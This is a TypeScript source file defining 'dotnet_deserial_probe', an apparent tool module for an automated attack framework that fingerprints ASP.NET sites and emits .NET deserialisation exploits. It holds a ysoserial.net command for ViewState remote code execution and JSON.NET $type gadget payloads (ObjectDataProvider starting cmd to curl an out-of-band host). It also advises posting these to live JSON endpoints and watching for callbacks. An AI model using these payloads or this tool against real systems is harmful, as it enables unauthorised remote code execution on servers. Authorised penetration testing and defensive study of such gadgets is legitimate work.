// T41 — dotnet_deserial_probe
// .NET deserialisation: ViewState MAC bypass, BinaryFormatter,
// JSON.NET TypeNameHandling, NetDataContractSerializer.

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'dotnet_deserial_probe',
  description:
    '.NET deserialisation attack suite. Tests ViewState MAC bypass, BinaryFormatter gadgets, ' +
    'JSON.NET $type injection (TypeNameHandling.All), and NetDataContractSerializer. ' +
    'Detection: ViewState in __VIEWSTATE parameter, X-Powered-By: ASP.NET, .aspx endpoints.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url',              type: 'string', required: true,  description: 'Target URL (.aspx or ASP.NET endpoint)' },
    { name: 'viewstate_mac',    type: 'string', required: false, description: 'Existing ViewState value to tamper with' },
    { name: 'target_framework', type: 'string', required: false, description: '.NET target framework hint (2.0/4.0/core)', default: 'auto' },
    { name: 'oob_host',         type: 'string', required: true,  description: 'OOB callback host for RCE confirmation' },
    { name: 'headers',          type: 'string', required: false, description: 'JSON extra headers' },
    { name: 'timeout_ms',       type: 'number', required: false, description: 'Per-request timeout ms', default: 15000 },
  ],
};

// JSON.NET type confusion payloads
const JSONNET_PAYLOADS = [
  { name: 'objectdataprovider', payload: '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","FileName":"cmd","Arguments":"/c curl OOB_HOST/dotnet-jsonnet"}}}' },
  { name: 'windowsidentity',    payload: '{"$type":"System.Security.Principal.WindowsIdentity, mscorlib","System.Security.ClaimsIdentity.actor":"AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0u..."}' },
];

async function detectAspNet(url: string, headers: Record<string, string>, timeoutMs: number): Promise<{ is_aspnet: boolean; has_viewstate: boolean; viewstate_value: string }> {
  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), timeoutMs);
    const resp = await fetch(url, { headers, signal: controller.signal });
    clearTimeout(timer);
    const text = await resp.text();
    const isAspNet = resp.headers.get('x-powered-by')?.toLowerCase().includes('asp.net') ||
      resp.headers.get('x-aspnet-version') !== null || url.includes('.aspx');
    const vsMatch = text.match(/name="__VIEWSTATE"\s+[^>]*value="([^"]{20,})"/);
    return { is_aspnet: !!isAspNet, has_viewstate: !!vsMatch, viewstate_value: vsMatch?.[1] || '' };
  } catch {
    return { is_aspnet: false, has_viewstate: false, viewstate_value: '' };
  }
}

export const dotnetDeserialProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const oobHost = String(params.oob_host || '');
    const viewstateMac = params.viewstate_mac ? String(params.viewstate_mac) : undefined;
    const timeoutMs = Number(params.timeout_ms || 15000);

    if (!url) return { output: 'url required', parsed: { error: 'missing_url' } };

    let headers: Record<string, string> = { 'User-Agent': 'Mozilla/5.0 GENESIS/4.0' };
    try { if (params.headers) Object.assign(headers, JSON.parse(String(params.headers))); } catch { /* ignore */ }

    const detection = await detectAspNet(url, headers, timeoutMs);

    const lines = [
      `dotnet_deserial_probe — ${url.substring(0, 80)}`,
      `ASP.NET detected: ${detection.is_aspnet}  ViewState found: ${detection.has_viewstate}`,
      '─'.repeat(72),
    ];

    if (detection.has_viewstate || viewstateMac) {
      const vs = viewstateMac || detection.viewstate_value;
      lines.push(`ViewState value (first 80): ${vs.substring(0, 80)}...`);
      lines.push('');
      lines.push('ATTACK PATHS:');
      lines.push(`  1. ViewState MAC bypass: use ysoserial.net with MachineKey gadgets`);
      lines.push(`     Command: ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "curl ${oobHost}/vs-rce" --generator=<generator>`);
      lines.push(`  2. If MachineKey is guessable (common keys list): brute-force with known keys`);
    }

    lines.push('');
    lines.push('JSON.NET TypeNameHandling probes (POST these to JSON endpoints):');
    for (const p of JSONNET_PAYLOADS) {
      const payload = p.payload.replace('OOB_HOST', oobHost);
      lines.push(`  [${p.name}]: ${payload.substring(0, 100)}...`);
    }
    lines.push('');
    lines.push('RECOMMENDED: If target accepts JSON, send $type payloads via forge_runner and monitor oob_check callback');

    return {
      output: lines.join('\n'),
      parsed: { detection, viewstate_found: detection.has_viewstate, attack_paths: JSONNET_PAYLOADS.map(p => p.name) },
    };
  },
};
